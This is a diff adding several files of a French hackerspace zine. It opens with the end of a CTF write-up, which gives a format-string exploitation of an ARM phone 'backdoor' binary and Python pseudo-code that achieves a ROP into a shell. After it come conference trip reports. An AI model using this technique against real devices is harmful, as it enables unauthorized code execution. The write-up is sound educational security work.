+écrirait "00000004 9" et i vaut 9 après son exécution.
+
+On peut utiliser des modificateurs pour maîtriser plus finement nos écritures :
+- "%k$n" utilise le k-ième argument -> choisir quel élément de la stack utiliser
+  comme pointeur
+- "%[nombre]i" insère du padding pour que le formatage du nombre prenne au moins
+  `nombre` octets -> ajuster plus facilement la valeur écrite par %n
+- "%hhn"  considère  que  le  pointeur  est  un  "uint8_t*"  et  "%hn"  pour  un
+  "uint16_t*" -> modifier seulement 1 ou 2 octets plutôt que 4
+
+Notre buffer fait 0x800  de long, on ne pourra donc pas padder  à plus que cette
+longueur, et on ne pourra pas écrire d'entier plus grand que 0x800. On s'oriente
+donc vers l'utilisation de "%k$hhn".
+
+       +----------------------------------------------------------------+
+       | Deuxième outil : écriture arbitraire de la stack via "%k$hhn". |
+       +----------------------------------------------------------------+
+
+Pour écrire  un entier 32 bits,  on a besoin de  4 "%hhn" qu'on peut  trier pour
+utiliser seulement 0x100 octets de  formatage et écrire n'importe quelle valeur.
+Il faut trier  les octets dans le  bon ordre. Par exemple,  écrire 0x7fff0482 en
+0x1234 revient à écrire  0x82 en 0x1234, 0x04 en 0x1235, 0xff  en 0x1236 et 0x7f
+en 0x1237 : `printf("%1$4i%1$hhn" "%1$123i%2$hhn" "%1$3i%3$hhn" "%1$125i%4$hhn",
+0, 0x1235, 0x1237, 0x1234, 0x1236);`.
+
+
+## [ Que faire avec ces outils ? ] ------------------------------------ [ 4 ] ##
+
+La stack  comprend deux éléments essentiels  à l'exécution d'un programme  : les
+variables locales de la fonction, l'adresse de retour (pour que l'appelant de la
+fonction  puisse reprendre  l'exécution après  l'appel de  la fonction),  et des
+valeurs des registres qu'il faut préserver pour l'appelant. Pour schématiser ces
+éléments sur la stack au moment de l'appel à snprintf :
+
+|   /    <--- sp (stack pointer) au moment de l'appel
+|   | variables locales de cmd_echo
+|   \
+|   sauvegarde registres
+|   adresse de retour vers handle_commands (0x9194)
+|   /
+|   | variables locales de handle_commands
+|   \
+|   sauvegarde registres
+|   adresse de retour vers handle_client (0x9828)
+| [...]
+v (adresses mémoires croissantes vers le bas)
+
+Un vecteur  d'attaque semble  se dessiner  : modifier  l'adresse de  retour vers
+handle_commands  pour exécuter  à  la  place do_cmd_shell.  Il  s'agit d'un  ROP
+(Return-Oriented Programming).
+
+Toutes  les adresses  *après* sp  sont  accessibles en  lecture directement  via
+"%k$x". Mais  on ne  peut utiliser  que des pointeurs  *présents après  sp* pour
+pouvoir écrire.
+
+Il faudrait énormément  de bol pour qu'un pointeur sur  la stack nous permettant
+de modifier directement l'adresse  de retour existe. Et ce n'est  pas le cas. Il
+faut donc  analyser plus  en détail les  variables globales pour  voir si  on en
+maîtrise des zones ou non.
+
+Regardons le prologue de cmd_echo :
+
+  mov ip, sp
+  push {fp, ip, lr, pc}
+  sub fp, ip, 4
+  sub sp, sp, 0x38
+
+Et l'épilogue correspondant :
+
+  sub sp, fp, 0xc
+  pop {fp, sp, pc}
+
+La fonction sauvegarde fp (Frame Pointer, le registre r11), ip (r12) qui vaut en
+fait  sp  avant  le  push,  lr  (contient  l'adresse  de  l'instruction  suivant
+l'instruction bl qui a appelé cette fonction), et enfin pc (Program Counter). Ce
+dernier  registre n'est  pas ré-utilisé  et sert  uniquement à  garder la  stack
+alignée à  8 octets.  On peut le  voir en  analysant l'épilogue :  seul 3  des 4
+registres sont  pop en sortie,  et en regardant bien,  fp et sp  reprennent leur
+valeur, et pc prend la valeur de lr.
+
+La fonction  s'est donc  réservée 0x38  octets sur la  stack pour  ses variables
+locales (également aligné à 8 octets), soit entre 13 ou 14 mots. En schéma :
+
+| local_00   <--- sp après le prologue
+| local_04
+| local_08
+| local_0c
+| ...
+| local_30
+| local_34
+| fp avant le prologue
+| sp avant le prologue
+| lr == addr instruction après bl cmd_echo
+| pc avant le prologue (padding)           <--- fp pendant cmd_echo
+|                                          <--- sp on entry
+v
+
+On peut accéder aux variables locales de deux manières :
+- par le début de la stack, l'adresse de local_00 est sp+0x00
+- par la fin de la stack,   l'adresse de local_00 est fp-0x40
+
+Avec  un  travail  d'analyse  sur  cmd_echo et  handle_commands,  on  déduit  la
+composition de la stack au moment de l'appel à snprintf. La mention "argK" donne
+la valeur de k qui doit être utilisé  dans "%k$x" ou "%k$hhn" pour accéder à cet
+emplacement de la stack.  Pour rappel, on commence à arg2 car  arg1 est passé en
+registre via r3.
+
+| arg02  / [padding]   <--- sp au moment de l'appel à snprintf
+| arg03  | cmd_echo: socket
+| arg04  |           [unused]
+| arg05  |           error_msg
+| arg06  |           error_msg
+| arg07  |           error_msg
+| arg08  |           error_msg
+| arg09  |           error_msg
+| arg10  |           error_msg
+| arg11  |           error_msg
+| arg12  |           error_msg
+| arg13  |           *to_echo
+| arg14  |           len_to_echo
+| arg15  \           *to_print
+| arg16  save fp
+| arg17  save sp
+| arg18  save lr ---> retour en 0x9194
+| arg19  [padding]                 <--- fp pointe ici pendant cmd_echo
+| arg20  / [padding]
+| arg21  | handle_commands: socket
+| arg22  |                  [unused]
+| arg23  |                  buffer_commande[ 0.. 3]
+| arg24  |                  buffer_commande[ 4.. 7]
+| arg25  |                  buffer_commande[ 8..11]
+| arg26  |                  buffer_commande[12..15]
+| arg27  |                  buffer_commande[16..19]
+| arg28  |                  buffer_commande[20..23]
+| arg29  |                  buffer_commande[24..27]
+| arg30  |                  buffer_commande[28..31]
+| arg31  \                  len_command
+| arg32  save fp
+| arg33  save sp
+| arg34  save lr ---> retour en 0x9824
+| arg35  [padding]                 <--- fp pointe ici pendant handle_commands
+
+On remarque ici que le buffer_commande (appelé "buf" dans les symboles de debug)
+est alloué  dans la stack  par handle_commands. On  note aussi que  le programme
+utilise strcmp("echo",  buffer_commande) pour  voir si  la commande  envoyée est
+"echo".  Ceci signifie  que seuls  les  5 premiers  caractères seront  vérifiées
+("echo" suivi du \0 indiquant la fin de chaîne en C).
+
+On peut  donc utiliser tout  ce qu'il  y a derrière  buffer_commande[5..30] pour
+écrire ce qu'on  veut sur la stack (on ne  peut pas utiliser buffer_commande[31]
+car le  code le met à  0 après réception de  la commande pour éviter  les buffer
+overruns). Comme on ne peut accéder à cette zone qu'au travers des argK qui sont
+alignés  aux mots,  seuls 5  emplacement seront  utilisables :  arg25..arg29. On
+pourrait utiliser arg24 si notre adresse a son octet de poids faible à 0x00.
+
+            +-----------------------------------------------------+
+            | Pour écrire via snprintf, on maitrise arg25 à arg29 |
+            |   en envoyant des adresses par la commande "echo".  |
+            +-----------------------------------------------------+
+
+
+## [ Atterrissage ] --------------------------------------------------- [ 5 ] ##
+
+Le but  est de  sauter vers  do_cmd_shell. Malheureusement,  la fonction  a pour
+signature do_cmd_shell(socket).  Il faut  donc que  le registre  r0 soit  égal à
+socket...  Or, en  sortant de  cmd_echo, r0  contient une  valeur interne  de la
+fonction, en l'occurrence la valeur de retour  de free (qui ne renvoie rien donc
+on ne sait  vraiment pas ce qu'il y a  dans r0 à ce moment là).  On ne peut donc
+pas sauter directement au début de la fonction.
+
+En revanche,  cette fonction est appelée  par cmd_shell qui charge  r0 depuis la
+stack :
+
+0x8ed8  ldr r0, [fp, -0x60]
+0x8edc  bl 0x8cc4
+
+Cet  endroit est  un meilleur  point d'atterrissage,  mais il  faudra placer  la
+valeur de socket  au bon endroit sur  la stack. Cette valeur ne  change pas pour
+toute la durée de la connexion, et on peut la trouver ailleurs sur la stack (par
+exemple en arg3,  arg21). Elle vaut généralement un entier  assez faible (<0x800
+qui est  notre limite  via snprintf), donc  on pourra utiliser  un seul  %n pour
+l'écrire.
+
+                 +--------------------------------------------+
+                 |         Pour appeler do_cmd_shell,         |
+                 | mettre socket au bon endroit sur la stack, |
+                 |           puis ROPer en 0x8ed8.            |
+                 +--------------------------------------------+
+
+Ce write-up considère pour l'instant que la stack change d'adresse mémoire entre
+deux exécutions du programme. Mais il est également possible que le programme ne
+soit pas chargé au même endroit entre deux exécutions. Il faudra donc prendre la
+peine de lire  lr avant de le ré-écrire,  pour ajuster au bon endroit  où est le
+code en mémoire. On s'attend à ce que sa valeur soit 0x9194 quand on veut écrire
+0x8ed8. Il  suffira de  faire lr_read-(0x9194-0x8ed8) pour  se retrouver  au bon
+endroit, quelque soit l'adresse de base du programme en mémoire sur la cible.
+
+
+## [ Attaque ] -------------------------------------------------------- [ 6 ] ##
+
+Résumons les étapes de l'attaque :
+- se logguer
+- préparer l'appel à do_cmd_shell :
+  - lire la valeur de socket dans la stack
+  - lire la valeur qu'aura fp pendant le ROP (en sortie de cmd_echo, arg16)
+  - écrire socket en fp-0x60
+- écrire le ROP :
+  - lire la valeur de lr en sortie de cmd_echo (arg18)
+  - trouver son adresse pour le ré-écrire (par  exemple sp de cmd_echo pointe
+    vers arg20, donc sp-8 pointe vers l'emplacement de lr en stack)
+  - écrire lr-(0x9194-0x8ed8) à cet emplacement
+
+Notre  ROP  n'est pas  vraiment  amicale  avec la  stack  et  on ne  pourra  pas
+reprendre  le cours  "normal" du  programme après  avoir ROPé  (pas de  retour à
+handle_commands)... Il faut donc effectuer le ROP en une seule commande echo. En
+revanche, on  peut faire autant  de echo de  lecture que nécessaires  puisque la
+stack se retrouvera aux mêmes emplacement entre 2 appels à echo.
+
+Pseudo-code (syntaxe python), en considérant  que l'appel arg(buf) envoie sur la
+socket le buffer buf en préfixant  sa longueur pour qu'il soit correctement reçu
+par le programme :
+
+```
+arg(b'login\x00'); arg(b'ph0wn\x00'); arg(b'5tr0ng_P@ssw0rd!\x00')
+# Lecture de ce qu'il nous faut
+arg(b'echo\x00')
+vals = arg(b'%3$x %16$x %18$x %17$x')
+socket, fp_cmd_echo, lr_cmd_echo, sp_before_echo = vals
+# Préparation de l'écriture
+new_lr = lr_cmd_echo - (0x9194-0x8ed8)
+addr_lr = sp_before_echo - 8
+# Comme la valeur écrite par %n ne fait qu'augmenter, on trie les bytes à écrire
+# dans l'ordre  croissant. On enregistre  l'adresse à  écrire avec le  byte pour
+# savoir comment organiser les adresses après la commande echo.
+lr_bytes_addr = sorted([
+    (socket, fp_cmd_echo-0x60, 'n'),
+    ((new_lr>> 0) & 0xff, addr_lr+0, 'hhn'),
+    ((new_lr>> 8) & 0xff, addr_lr+1, 'hhn'),
+    ((new_lr>>16) & 0xff, addr_lr+2, 'hhn'),
+    ((new_lr>>24) & 0xff, addr_lr+3, 'hhn'),
+])
+# On  empile  les  adresses  à écrire  à  la suite  de  la  commande en  gardant
+# l'alignement à 4 octets
+arg(b'echo\x00\x01\x02\x03'+b''.join(addr for _,addr,_ in lr_bytes_addr))
+# On a besoin de nombre d'octets *entre* deux valeurs (%x successifs)
+n_pad = 0
+diff_pads = []
+for val,_,flag in lr_bytes_addr:
+    diff_pads.append((val-n_pad, flag))
+    n_pad += val-n_pad
+# Ecrit avec les %k$hhn pour écrire (les pointeurs seront en arg25 et suivants)
+#  (n'écrit pas %x si pad == 0)
+req = ''
+for i,(pad,flag) in enumerate(diff_pads):
+    if pad: req += f'%1${pad}x'
+    req += f'%{25+i}${flag}'
+arg(req.encode())
+```
+
+Après ça,  on peut envoyer des  commandes et recevoir le  résultats. Par exemple
+"ls" puis "cat flag"...
+
+
+## [ Émulation ] ------------------------------------------------------ [ 7 ] ##
+
+Un  point qui  prend du  temps la  première fois  qu'on le  fait mais  qui n'est
+finalement  pas si  compliqué... J'ai  d'abord essayé  de re-compiler  le kernel
+correspondant à  la distrib et  le lancer avec qemu.  Mais de toutes  façons, je
+n'aurai pas  les périphériques branchés sur  le T46S (écran, boutons,  ...) donc
+même après une compilation réussie et  des ajustements sur qemu (sans succès eux
+^^), c'était peine perdue d'avance (!!!)
+
+La commande utile  est `qemu-arm -L rootfs/  rootfs/phone/bin/backdoor`. On peut
+aussi utiliser qemu-arm-static. Ça suffit et fonctionne très bien !
+
+A noter cependant que pour pouvoir debug l'application, gdb-multiarch fonctionne
+(utiliser gef  ou peda par exemple),  sauf le mode "follow-fork-mode  child" qui
+permettrait de suivre un fork. Hors, le programme fork.
+
+On  peut patcher  la  boucle de  la  fonction  main qui  réalise  le fork  assez
+facilement. Il suffit de remplacer l'appel à fork par son code de retour dans le
+process  forké  (qui est 0).  `mov r0, 0`  se compile en 00 00 a0 e3  qu'on peut
+patcher à l'aide de xxd et sed :
+
+```
+cp rootfs/phone/bin/backdoor rootfs/phone/bin/backdoor~
+xxd rootfs/phone/bin/backdoor~ |\
+    sed 's,^00001ab0.*,00001ab0: b2fb ffeb 0000 a0e3 0030 a0e1 1c30 0be5,' |\
+    xxd -r > rootfs/phone/bin/backdoor
+```
+
+L'inconvénient est que le programme termine après un seul client. L'avantage est
+qu'on peut suivre (et debugger) le déroulement du pwn...
+
+On peut lancer `qemu-arm -g  9998 -L rootfs/ rootfs/phone/bin/backdoor` dans une
+console, utiliser  .gdbinit pour définir  nos paramètres  ("target remote 9998",
+"set sysrootfs ...", breakpoints, ...), et lancer notre script de pwn.
+
+
+## [ Chemin alternatif ] ---------------------------------------------- [ 8 ] ##
+
+Le chemin initialement proposé par le challenge était de se baser sur rand. J'ai
+d'abord cru que ce chemin était  plus compliqué parce qu'il fallait prédire rand
+sur une architecture CPU différente, mais ce chemin est en fait plus simple !
+
+Une première clef est  que srand est exécuté au début  du programme, et conserve
+sa valeur au travers des fork. Chaque nouveau client a donc la même seed et aura
+les mêmes valeurs retournées par les appels à rand().
+
+Un autre particularité de rand est que l'algorithme est stable depuis un certain
+nombre  d'années  et  son  implémentation  sur  différentes  architecture  donne
+également les mêmes résultats (c'est du  C après tout, c'est assez logique). Par
+exemple, après  un srand(0), rand() donne  1804289383 à travers qemu-arm  et sur
+mon hôte x64 qui  a une libc 10 ou 15 ans plus  récentes. On peut donc récupérer
+l'état en mémoire après srand via snprintf et prédire sur notre machine les rand
+suivants.
+
+Il  faudra utiliser  un  outil  légèrement différent  :  "%25$s" déréférence  le
+pointeur qu'on met  après la commande echo  et lit comme si  il s'agissait d'une
+chaîne de texte (jusqu'au prochain \0). Il faudra également trouver l'adresse de
+chargement de la libc pour pouvoir pointer  vers la zone mémoire qui contient la
+seed. On peut ensuite soit utiliser un code C pour obtenir les valeurs de rand()
+à prédire, soit directement appeler la libc en python via ctypes.
+
+Après  cet appel,  on  se retrouve  dans do_cmd_shell(socket)  sans  avoir eu  à
+utiliser l'outil d'écriture !
+
+
+## [ Fin ? ] ---------------------------------------------------------- [ 9 ] ##
+
+Le but du challenge était d'ouvrir  les possibles après cette première connexion
+et de jouer  avec le téléphone. Plusieurs  idées qu'on aurait pu  filer (je n'en
+suis pas l'auteur) :
+- charger des fichiers via le et remplacer les icônes affichées lors d'un appel
+  (dans /data/userdata/contact-image/)
+- faire sonner le téléphone
+- changer la sonnerie du téléphone
+- utiliser le framebuffer pour changer l'image affichée sur le téléphone
+- compiler et charger fbDOOM (idée des concepteurs du challenge)
+- ...
+
+Merci encore à toute l'équipe pour ce challenge très original !
+
+::::::::::::::
+04.txt
+::::::::::::::
+  _______      ___       ______      ______    
+ /" _   "\    /. ")     /    " \    /    " \   
+(: (_/  :|   /:  /     // ____  \  // ____  \  
+ \____/ |)  //  /___  /  /    ) :)/  /    ) :) 
+    _\  '| (   / _  \(: (____/ //(: (____/ //  
+   /" \__|\|:   /_) :)\        /  \        /   
+  (________)\_______/  \"_____/    \"_____/ bauds   	
+
+┌────────────────────────────────┐
+│ ISSUE No 4 - Aout 2026  04.TXT └─────────────────────────────────────────────┐
+| SUMMER Trip :: LeHACK & Pass the Salt                                        |
+| Tuxlu                                                                        |
+| GRENOBLE HACKERSPACE                                                         |
+└──────────────────────────────────────────────────────────────────────────────┘
+
+::: LE HACK :::
+:::::::::::::::
+
+Nouvelle fournée de conférences sécu et en encore une fois le mot d'ordre est
+IA. Mais contrairement au Fosdem, ici on accueille plutôt nos nouveaux seigneurs
+AI. Comment utiliser l'IA, tools vibe-codés, intégrations MCP, slides 
+générées... On souffle parfois un peu. Heureusement, ces événements permettent 
+de rencontrer des vrais humains et avoir des conversations intéressantes! 
+
+Un des talks qui m'a le plus marqué d'ailleurs était non pas par son contenu 
+technique, mais pour sa mise en scène, avec des slides garantie fait main avec 
+des bouts de 3D crées sous Blender! "Permis d'illuminer toute la ville" par 
+MadSquirrel. La vulnérabilité assez simple (une application d'allumage 
+d'éclairage publique ouverte aux quatre vents) mais avec un jeu d'acteur 
+inspiré d'OSS 117. Je vous conseille le replay! (quand ils seront dispo, d'ici 
+6 mois peut-être :/ )
+
+Dans les autres talks, citons :
+
+- "RF : une menace invisible", sur la recherche de mouchards et l'isolation 
+contre l'écoute radio, de quoi rendre parano et vérifier ses faux plafonds.
+- "Trust Me, I’m A Shortcut", sur les méthodes pour cacher furtivement des 
+payloads malveillants dans les liens Windows. 
+- "Sighax deep dive", sur l'architecture de la Nintendo 3DS et son hacking.
+
+Je sais que ça ne se fait pas vraiment, mais je me permets d'exprimer une 
+déception, avec toutefois une note d'espoir: L'intitulé du talk sur Reversense 
+me mettait l'eau à la bouche: une plateforme open-source de hacking 
+d'applications mobile intégrant une myriade de scripts Frida pour 
+automatiquement obtenir une vue d'ensemble détaillée sur un projet. Hélas le 
+talk était assez peu clair sur l'usage concret de la plateforme. Il suffisait 
+de se rendre au workshop pour tester directement? Hélas non, le code était 
+dispo, mais il n'y avait aucune instruction sur comment le setup :(
+Dommage de ne pas profiter du momentum de l’événement pour publier proprement 
+le projet dans le même temps, mais j'espère de tout coeur qu'il sera disponible 
+d'ici la sortie de ce zine!
+
+Mais LeHack ça n'est clairement pas que la scène principale: le village hardware 
+était une super nouveauté (je dis pas ça parce que Beemo relis mon texte, promis
+;_; ). J'ai beaucoup aimé le challenge "bus CAN" de Quarkslab ou on peut se
+connecter au tableau de bord d'une voiture pour changer l'affichage de la radio,
+mais aussi de la vitesse ou des warnings!
+
+Mention aussi aux talks Osint très présents. Ça n'est pas mon domaine, mais j'ai
+eu très plaisir à regarder des pros de Geoguessr expliquer la "meta", comment
+ils remarquent qu'ils sont sur une route en Guinée car il y a du scotch sur le 
+rétroiseur de la voiture Google Maps.  Et ce à 2h du matin. (le CtF était 
+difficile , j'avais besoin d'une pause , ok? (T^T) )
+
+
+::: PASS THE SALT :::
+:::::::::::::::::::::
+
+Quittons donc la fournaise parisienne (à défaut de glaces, le goodies le plus 
+populaire de LeHack était un éventail! ) et profitons de la fraîcheur du Nord. 
+Agrémentées de bières, offertes par le "social event" de Pass the salt! Une 
+conférence aux thématiques particulièrement intéressante puis qu'elle mêle 
+sécurité et Open-source.
+
+Plein de talks très intéressants et variés. IA toujours, le "Director of 
+engineering" de chez Mozilla était là pour nous parler des merveilles de Claude 
+Mynthos sur Firefox... Et c'était au final plutôt boring: pas de détails sur 
+les vulns trouvées, mais juste une explication sur le setup des modèles et des 
+prompts utilisés. Le futur de notre boulot quoi. Youpi :/
+
+En talks qui valent le détour (et dont les replays sont dispos sur le site de 
+l'event):
+
+- "Oblivious HTTP", sur un protocole pour cacher notre adresse IP aux serveurs 
+en passant par des serveurs proxy. Encore une bonne initiative pour la vie privée!
+- "Bypassing BitLocker in under 5 min", qui démontre q'un Bitlocker sans pin 
+est un peu comme une serrure sur une porte qu'on peut démonter.
+
+J'ai aussi fait un workshop très intéressant sur Sighthouse, un système pour 
+simplifier la vie des reversers en détectant automatiquement les fonctions 
+connues, comme les libs de chiffrement. Projet techniquement impressionnant 
+avec un petit bémol: Pour que ça marche, il faut se créer une base de données 
+en compilant des tonnes de projets pour plein d'architectures, avec plein de 
+combinaisons de flags de compilations. La db des créateurs du projet a mis 6 
+mois à se compiler sur leur serveur... et elle n'est pas publique! Ils mettent 
+en place les instructions pour la build, alors faites chauffer votre serveur 
+local ^^' 
+
+Voilà , une semaine de conf bien remplie, rendez vous à Grehack pour ma part!
+::::::::::::::
+05.txt
+::::::::::::::
+  _______      ___       ______      ______    
+ /" _   "\    /. ")     /    " \    /    " \   
+(: (_/  :|   /:  /     // ____  \  // ____  \  
+ \____/ |)  //  /___  /  /    ) :)/  /    ) :) 
+    _\  '| (   / _  \(: (____/ //(: (____/ //  
+   /" \__|\|:   /_) :)\        /  \        /   
+  (________)\_______/  \"_____/    \"_____/ bauds   	
+
+┌────────────────────────────────┐
+│ ISSUE No 4 - Aout 2026  05.TXT └─────────────────────────────────────────────┐
+| leHACK 2026 - Brave New World                                                |
+| Beemo <nflatrea@mailo.com>                                                   |
+| GRENOBLE HACKERSPACE                                                         |
+└──────────────────────────────────────────────────────────────────────────────┘
+   __        __                                                  __        __  
+  /  \_====_/  \                                                /  \_====_/  \ 
+ ( (\ ' 00 ` /) )                                              ( (\ ' 00 ` /) )
+  \__/======\__/                                                \__/======\__/ 
+      ||||||                                                        ||||||    
+      |`||/                                                         |||||:     
+      ||||\                                                         \||||\     
+      ||||||                                                        /|||||    
+     (======)                            *                         (======)  
+      ||||||                                                        ||||||                                                                                  
+      |/||`|                __     __  _____   ________ __          |/||`|  
+      ||||||               / /__  / / / /   | / ____/ //_/          |||||| 
+      ||||||              / / _ \/ /_/ / /| |/ /   / ,<             |||!||  
+      ||||||             / /  __/ __  / ___ / /___/ /| |            ||||||  
+      \|||||            /_/\___/_/ /_/_/  |_\____/_/ |_|            :|||||  
+      /|||||            ..:. .  . .:. ..... . ..:.. .  .            |||||/   
+      ||||||            2026 ~ b r a v e n e w w o r l d            ||||||  
+      ||`|||            . ::.  .:. .  .:.  .   ... ..:.             ||`|||                                                                                  
+      \||||'                                                        \||||'                                
+      |/||`|                  TRiP REPoRT :: Beemo                  |/||`|    
+     (======)                                                      (======)   
+      ||||||                                                        |||||/    
+      ||||||                                                        |||||\       
+      ||`|||                                                        ||`|||    
+      \||||'                                                        \||||'    
+        .| |                                                          .| |    
+      :/| |.                                                        :/| |.    
+          .                                                            .    
+        :                                                             :       
+
+TLDR
+
+J'ai pas beaucoup participé autrement qu'en faisant le pitre sur scène,
+Beaucoup trop de travail pour une année de plus à Paris. Le thème était
+sympa, j'ai pu recroiser du monde et on as surtout pêter les scores
+d'épuisement entre un workshop, une présentation et le tout nouveau village
+hardware, leLAB. Bref une année mémorable :P
+
+INTRo
+
+Cette année, leHACK nous a pondu un thème bien ambitieux BRAVE NEW WORLD;
+
+Perso, j'ai surtout retenu que c'était l'occasion de monter voir les copains.
+Année particulière tout de même car en plus de faire un Workshop, j'ai eu 
+l'occasion de faire une présentation (R4d1o_P1r4t3) et de participer à l'orga
+d'un tout nouveau village hardware avec Tcccorp, Virtu, Tix, Prom', orwen, 
+7h30th3r0n3, erdnaxe, Scttpr, Dr4s1l et les autres que j'aurais oublié
+
+Comme je bosse (oui choquant), je suis arrivé sur Paris quelques jours avant,
+profitant d'une mission sur place. J'ai pu négocier mon 26 et 27 juin, j'ai une
+partie du AirBnB qu'est gracieusement payé et le train qui par chance m'est
+offert par l'équipe de HzV
+
+Avec un autre membre Hackerspace on c'est décidé à monter un maximum de materiel
+pour leLAB, alors j'ai bourré deux gros sacs à dos de matos, et quand j'ai vu 
+que ça rentrait pas, j'ai balancé le reste dans une caisse. 
+
+Résulat des trucs apportés :
+
+	Matériel de mesure
+	::::::::::::::::::	
+	- 5 multimètres C.A 5233
+	- 6 oscillos Textronix TDS 1022 + probes
+	- 1 set de PCBite Probes x4
+	- 3 SDRs (RTL-SDR, HackRF et HydraSDR)
+	- 5 antennes + amplis 20dB 
+	- 1 set de micro tournevis iFixit
+
+	Interfaces
+	::::::::::
+	- 1 PicoGlitcher v3 
+	- 1 Bus Pirate v5 
+	- 10 CH340/CH341 + leurs princes 
+	- 2 STL-Link v2
+	- 5 analyseurs logiques 8CH
+
+	Targets
+	:::::::
+	- 9 routeurs Linksys WRT54GL (classiques, indémodables)
+	- 2 GuD PLC
+	- 1 Neufbox NB6WAC 
+	
+	Et d'autres merdouille IoT dont j'ai plus idée....
+
+Avec mes petites magouilles j'en suis revenus pour :
+
+	- 0€ de train (Un grand merci à HzV :D)
+	- 480€ pour 8 jours à Argenteuil (cave humide, puante, mais bon marché)
+	- ~80€ de tickets de métro
+
+A mon arrivé, le matos était éparpillé entre BellY dans une caisse, et moi dans 
+un gros sac. J'ai laissé le materiel au AirBnB jusqu'au 25 juin, date à la 
+laquelle on c'est rejoins. Bon spoiler C'était lourd, il faisait tarpin chaud 
+et l'endroit ou j'était puait la pollution, les poubelles et l'humidité
+
+BRAVE new WORLD
+
+J-1 :: Préparation du village LeLAB
+
+Faut d'abord savoir que l'événement est à la Cité des sciences et de 
+l’industrie, 30 av Corentin Cariou, 75019 PARIS. Donc pas dutout à Argenteuil.
+
+Je suis à Gennevillier pour le travail et BellY arrive à Gare de Lyon. 
+
+Il à pas eu de chance, il pouvais pas s'amener en voiture, et à donc du tout 
+foutre dans un sac de sport et ce taper les 15 kilos de materiels. Merci encore 
+à lui pour le transport, qu'as dû se trimballer cette putain de caisse.
+
+On passe le portique sans trop de difficulté, rigolant évidemment de la 
+quantitée absurde de bordel par bien rangé dans des sacs pas bien fermés. On 
+rejoins donc le salon leHACK la veille de son ouverture pour poser les affaires.
+Pas d'bol on peux pas rentrer sans bracelet et on en as pas....Tccorp à bien 
+gentillement fait du social pour nous laisser rentrer et j'ai enfin eu la 
+possibilitée de poser les affaires. Je rejoins tout le monde dans la petite 
+salle et commence à poser mon merdier à côté de Virtu, juste devant l'entrée.
+
+NB: La salle est séparée en deux parties, ouvertes pour l'occasion. Une première
+rangée de tables sur la gauche en rentrant, une seconde en face et une dernière
+tout au fond à droite.
+
+       ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+       ┃          7h30th3r0n3   DVID            ┌───┐                 ┃
+       ┃             ┌──────┬──────┐            │░░░│                 ┃
+       ┃             │░░░░░░│░░░░░░│            │░░░│  Tables         ┃
+       ┃             └──────┴──────┘            ├───┤  d'Ateliers     ┃
+       ┃                                        │░░░│                 ┃
+       ┃      ┌───┐                             │░░░│                 ┃
+       ┃Virtu │░░░│                             └───┼──────┬──────┐   ┃
+       ┃      │░░░│                                 │░░░░░░│░░░░░░│   ┃
+       ┃Tix   ├───┤                                 └──────┴──────┘   ┃
+       ┃      │░░░│                                                   ┃
+       ┃CarIn │░░░│                                                   ┃
+       ┃aBox  ├───┤                                                   ┃
+       ┃      │░░░│           ┏━━━━━━━━━━━━━━━━━┓               ┌───┐ ┃
+       ┃Beemo │░░░│           ┃                 ┃         Gadget│░░░│ ┃
+       ┃      └───┘           ┃                 ┃               │░░░│ ┃
+       ┃                      ┃      ENTREE     ┃               └───┘ ┃
+       ┃                      ┃                 ┃                     ┃
+       ┗━━━━━━━━━━━━━━━━━━━━━━┛        ╔ ═ ═ ═ ■┗━━━━━━━━━━━━━━━━━━━━━┛
+                          ┌───┐                 ┌──────┬──────┐        
+              Un zozo qui │░░░│                 │░░░░░░│░░░░░░│        
+              comptais    │░░░│                 └──────┴──────┘        
+              les gens    └───┘                  Stickers et Goodies   
+
+
+Je savais pas trop comment m'organiser, je vois autour de moi et je sais pas 
+quoi foutre de mes 6 oscillos, 5 targets etc. Je décide donc de mettre mon vieux
+pc, une live ISO de DragonOS + HackRF en libre service devant la table. Derrière 
+5 oscillos empilé dont un branché channel 1 sur le RX d'un vieux LINKSYS dépioté
+et un CH340 branché au PC. Tccorp à la gentillesse de me filer deux gateways 
+Zigbee en plus que je vais pouvoir mettre dans ma pile de merdier.
+
+Pendant que BellY m'aide à organiser la table, je fous les multimètres sur la 
+grande table en plus des fers à souder posés par Tccorp
+
+On discute bien et on finis la journée et on profite de l'occasion pour
+s'incruster au repas des speakers. On fait connaissace, je recroise Biero qui va
+aussi présenter, Stéphane et deux nouvelle personnes que je connais pas.
+
+On reste jusque 23h avant ce ce rendre compte que notre dernier train est à 
+00h00 et on s'en va discrètement prendre le tram ;)
+
+je suis sorti de là avec :
+                                                  _
+                                                 {_}
+	2 pintes de bière dans le bide           |(|
+	Des oeufs mayonnaises en entrée         /   \    .    ' .
+	Un steak sauce poivre avec des frites   |.--|  '     \~~~/
+                                                ||  | \~~~/   \_/  
+	Je suis pas très viande, je mange       |'--|  \_/     Y 
+	majoritairement	végétarien mais         '-=-'   Y     _|_
+	y'avais du monde et y'avais que ça	       _|_jgs
+	donc j'ai pas fait le mec chiant					
+
+Résulat, on as pas payé un copec ;P
+
+
+
+J+0 :: Ateliers, ballade et découvertes
+
+Paris étant Paris, on as décider de ce lever un peu plus tôt pour arriver à 
+8h30 d'Argenteuil, pas d'bol, les train argenteuil paris est blindé le matin on 
+as du attendre bien un ou deux trains ava ot de pouvoir partir, saucissonné dans
+le wagon. Puis le métro, toujours saucissonné jusqu'à arriver à l'entrée.
+
+Cette fois, 8h00 du mat, la queue faisais au moins 150m on c'est perdu de vue 
+avec BellY et j'ai hésité à gruger Je suis finallement resté calme et j'ai
+attendu mon tour. Petit bracelet en poche, badge VIP/Speaker et bandoulière 
+j'ai pu filer directement dans la salle pour poser mes affaires, dire bonjour
+et me ballader. J'en ai profité pour préparer le laptop en libre service. J'ai
+démarré la machine sur DragonOS, allumé ./Simple_IMSI_catcher.py 
+(je savais qu'il passait donc petit clin d'oeil) avec une note en gros et gars, 
+
+                               __..._   _...__
+                          _..-"      `Y`      "-._
+                          \ N'AIE PAS |  UTILISE   /
+                          \\  PEUR..  | -MOI :P  //
+                          \\\         |         ///
+                           \\\ _..---.|.---.._ ///
+                        jgs \\`_..---.Y.---.._`//
+                             '`               `'
+
+Je suis ensuite allé faire les retrouvailles au stands en attendant mon tour 
+pour les ateliers. Tccorp préparais son atelier soudure, 7h30th3r0n3 avais monté
+son hall of shame, affichant tout les flippers avec le bluetooth allumé, Gadget 
+c'est assis dans un coin avec son oscillo et un fat écran et virtu m'a montré sa
+découpe vinyl qu'il as reprogrammé.
+
